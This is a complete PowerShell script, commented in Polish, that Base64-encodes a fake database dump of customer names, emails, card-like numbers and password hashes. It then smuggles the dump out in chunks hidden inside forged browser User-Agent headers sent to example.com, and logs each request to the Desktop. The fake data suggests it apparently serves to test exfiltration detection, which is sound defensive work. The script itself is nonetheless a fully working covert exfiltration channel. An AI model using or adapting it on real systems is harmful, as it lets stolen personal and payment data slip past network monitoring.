# ============================================================
# MASSIVE HTTP USER-AGENT EXFILTRATION (FIXED)
# ============================================================

# CONFIGURATION
# ------------------------------------------------------------
$TargetURL = "http://example.com" 
$RecordsCount = 500 
$ChunkSize = 100
# ------------------------------------------------------------

# 1. GENERATE MASSIVE FAKE DATASET
Write-Host "Generating massive fake dataset..." -ForegroundColor Cyan

$FakeDB = "HEADER:SQL_FULL_DUMP_V3|DATE:2025-06-01|ORIGIN:MAIN_DB_SERVER;"
for ($i = 1; $i -le $RecordsCount; $i++) {
    $FakeDB += "ROW_$i;ID:$i;User:Customer_Name_$i;Email:client_$i@company.com;CC:4000-1234-5678-00$i;PassHash:7f8a9b0c;"
}
$FakeDB += "FOOTER:END_OF_TRANSMISSION"

$Bytes = [System.Text.Encoding]::UTF8.GetBytes($FakeDB)
$Base64Payload = [System.Convert]::ToBase64String($Bytes)
$TotalLength = $Base64Payload.Length

Write-Host "Dataset Size (ASCII): $($FakeDB.Length) chars"
Write-Host "Payload Size (Base64): $TotalLength chars"
Write-Host "Target: $TargetURL"
Write-Host "--------------------------------------------------"
Start-Sleep -Seconds 2

# 2. SETUP REPORTING
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$ReportFile = "$DesktopPath\ua_massive_log.txt"
$LogEntries = @()

# 3. EXFILTRATION LOOP
$Offset = 0
$Sequence = 1
$SessionID = Get-Random -Minimum 10000 -Maximum 99999

Write-Host "Starting Massive Exfiltration..." -ForegroundColor Cyan

while ($Offset -lt $TotalLength) {
    
    if (($Offset + $ChunkSize) -gt $TotalLength) {
        $Length = $TotalLength - $Offset
    } else {
        $Length = $ChunkSize
    }
    
    $Chunk = $Base64Payload.Substring($Offset, $Length)
    
    # --- POPRAWKA TUTAJ ---
    # Używamy ${Zmienna}, żeby oddzielić nazwę od dwukropka
    $MaliciousUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 [X:${SessionID}:${Sequence}:${Chunk}]"
    
    try {
        $Response = Invoke-WebRequest -Uri $TargetURL -UserAgent $MaliciousUA -UseBasicParsing -ErrorAction SilentlyContinue
        
        if ($Sequence % 20 -eq 0) {
            Write-Host "[$Sequence] Sending chunk... ($Length chars)" -ForegroundColor Green
        }
    }
    catch {
        if ($Sequence % 20 -eq 0) {
            Write-Host "[$Sequence] Sending chunk... (Target Error)" -ForegroundColor Yellow
        }
    }
    
    # --- POPRAWKA TEŻ TUTAJ ---
    $LogEntries += "SEQ: $Sequence | UA: ...[X:${SessionID}:${Sequence}:${Chunk}]"
    
    $Offset += $ChunkSize
    $Sequence++
    
    Start-Sleep -Milliseconds 20
}

# 6. SAVE REPORT
$LogEntries | Out-File -FilePath $ReportFile -Encoding UTF8
Write-Host "--------------------------------------------------"
Write-Host "DONE. Sent $($Sequence - 1) HTTP requests."
Write-Host "Report saved to Desktop: ua_massive_log.txt"
